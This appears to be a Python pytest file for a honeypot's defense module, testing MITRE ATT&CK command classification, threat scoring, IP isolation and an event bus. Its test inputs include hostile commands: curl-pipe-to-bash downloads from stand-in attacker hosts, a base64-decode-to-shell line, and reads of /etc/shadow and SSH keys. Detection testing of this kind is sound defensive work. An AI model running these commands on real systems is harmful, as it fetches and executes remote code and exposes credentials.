# Dueño: P4 — Defensa y SOC
# Responsabilidad: Pruebas del mapeo MITRE y del Threat Score.
# Puede importar: honey_agent.defense y tests.fakes
# No importar: honey_agent.ingress, honey_agent.posix, honey_agent.tarpit, honey_agent.canary

from __future__ import annotations

import asyncio
import time

try:
    import pytest
except ImportError:
    class _MockPytestMark:
        def asyncio(self, f):
            return f
    class _MockPytest:
        mark = _MockPytestMark()
    pytest = _MockPytest()

from honey_agent.contracts.events import CommandExecutedEvent, ContainmentTriggeredEvent
from honey_agent.defense.event_bus import DistributedEventBus
from honey_agent.defense.netfilter import NetfilterIsolator
from honey_agent.defense.rules import classify_command
from honey_agent.defense.scorer import SessionThreatScorer
from tests.fakes.defense import FakeEventBus, FakeIsolator, FakeThreatScorer


def test_mitre_rules_detection():
    """Valida la detección correcta de las principales técnicas MITRE."""
    # Discovery
    c_uname = classify_command("uname -a")
    assert c_uname is not None
    assert c_uname.technique_id == "T1082"
    assert not c_uname.is_critical

    c_whoami = classify_command("whoami")
    assert c_whoami is not None
    assert c_whoami.technique_id == "T1033"

    # Credential Access (Crítico)
    c_shadow = classify_command("cat /etc/shadow")
    assert c_shadow is not None
    assert c_shadow.technique_id == "T1003"
    assert c_shadow.is_critical

    # Execution (Crítico)
    c_pipe = classify_command("curl -s http://attacker.com/payload.sh | bash")
    assert c_pipe is not None
    assert c_pipe.technique_id == "T1059.001"
    assert c_pipe.is_critical

    # Obfuscation (Crítico)
    c_b64 = classify_command("echo aGVsbG8= | base64 -d | sh")
    assert c_b64 is not None
    assert c_b64.technique_id == "T1027"
    assert c_b64.is_critical

    # Comando benigno
    assert classify_command("echo hello") is None
    assert classify_command("cd /var/www") is None


def test_mitre_rules_speed():
    """Garantiza que la clasificación de comandos sea sub-milisegundo (< 1 ms)."""
    commands = [
        "uname -a",
        "whoami",
        "cat /etc/shadow",
        "curl http://evil.com/x.sh | bash",
        "find / -name '*.conf'",
        "crontab -l",
        "netstat -tulpn",
        "ps aux",
    ]
    iterations = 2000
    start = time.perf_counter()
    for i in range(iterations):
        cmd = commands[i % len(commands)]
        classify_command(cmd)
    elapsed = time.perf_counter() - start
    avg_ms = (elapsed / iterations) * 1000.0

    # Promedio debe ser claramente inferior a 1 ms (típicamente < 0.05 ms)
    assert avg_ms < 1.0, f"Latencia promedio excesiva: {avg_ms:.4f} ms"


def test_scorer_critical_trigger():
    """Verifica que un trigger crítico eleve el score a 100 de forma inmediata."""
    scorer = SessionThreatScorer()
    sess_id = "test-sess-001"

    score, match, isolate = scorer.score_command(sess_id, "whoami")
    assert score < 80.0
    assert not isolate

    # Ejecución de comando crítico
    score, match, isolate = scorer.score_command(sess_id, "curl http://malware.org/run.sh | bash")
    assert score == 100.0
    assert isolate
    assert match is not None
    assert match.is_critical

    # Comandos posteriores permanecen en estado crítico
    score_later = scorer.get_score(sess_id)
    assert score_later == 100.0


def test_scorer_decay():
    """Verifica el decaimiento temporal exponencial en comandos no críticos."""
    scorer = SessionThreatScorer(decay_lambda=0.01)  # Decaimiento acelerado para el test
    sess_id = "test-sess-002"
    t0 = 1000.0

    score_t0, _, _ = scorer.score_command(sess_id, "find / -name id_rsa", timestamp=t0)
    assert score_t0 > 0.0

    # Tras 100 segundos
    score_t1 = scorer.get_score(sess_id, current_time=t0 + 100.0)
    assert score_t1 < score_t0


@pytest.mark.asyncio
async def test_netfilter_isolation_and_allowlist():
    """Verifica el aislamiento y la protección de IPs en lista blanca."""
    isolator = NetfilterIsolator(allowlist=["10.0.0.1", "127.0.0.1"], dry_run=True)

    # IP en lista blanca nunca es aislada
    assert not await isolator.isolate_ip("127.0.0.1", "Intento contra localhost")
    assert not isolator.is_isolated("127.0.0.1")

    assert not await isolator.isolate_ip("10.0.0.1", "IP administrativa")
    assert not isolator.is_isolated("10.0.0.1")

    # IP hostil es aislada
    hostile_ip = "198.51.100.42"
    assert await isolator.isolate_ip(hostile_ip, "RCE detectado")
    assert isolator.is_isolated(hostile_ip)

    # Desbloqueo
    assert await isolator.unisolate_ip(hostile_ip)
    assert not isolator.is_isolated(hostile_ip)


@pytest.mark.asyncio
async def test_event_bus():
    """Verifica la publicación y captura de eventos en memoria."""
    bus = DistributedEventBus()
    received_events = []

    def on_event(evt):
        received_events.append(evt)

    bus.add_subscriber(on_event)

    event = ContainmentTriggeredEvent(
        session_id="sess-999",
        attacker_ip="192.168.1.50",
        trigger_reason="T1059.001 detected",
        kernel_command="iptables -I INPUT -s 192.168.1.50 -j DROP",
        execution_duration_ms=2.5,
    )

    await bus.publish(event)
    assert len(received_events) == 1
    assert received_events[0].session_id == "sess-999"
    assert received_events[0].attacker_ip == "192.168.1.50"


def test_fakes():
    """Verifica el funcionamiento de los dobles de prueba."""
    fake_scorer = FakeThreatScorer()
    score, _, isolate = fake_scorer.score_command("s1", "curl http://evil.sh | bash")
    assert score == 100.0
    assert isolate

    fake_iso = FakeIsolator(allowlist=["127.0.0.1"])
    assert asyncio.run(fake_iso.isolate_ip("192.168.1.200", "test"))
    assert fake_iso.is_isolated("192.168.1.200")
    assert not asyncio.run(fake_iso.isolate_ip("127.0.0.1", "test"))
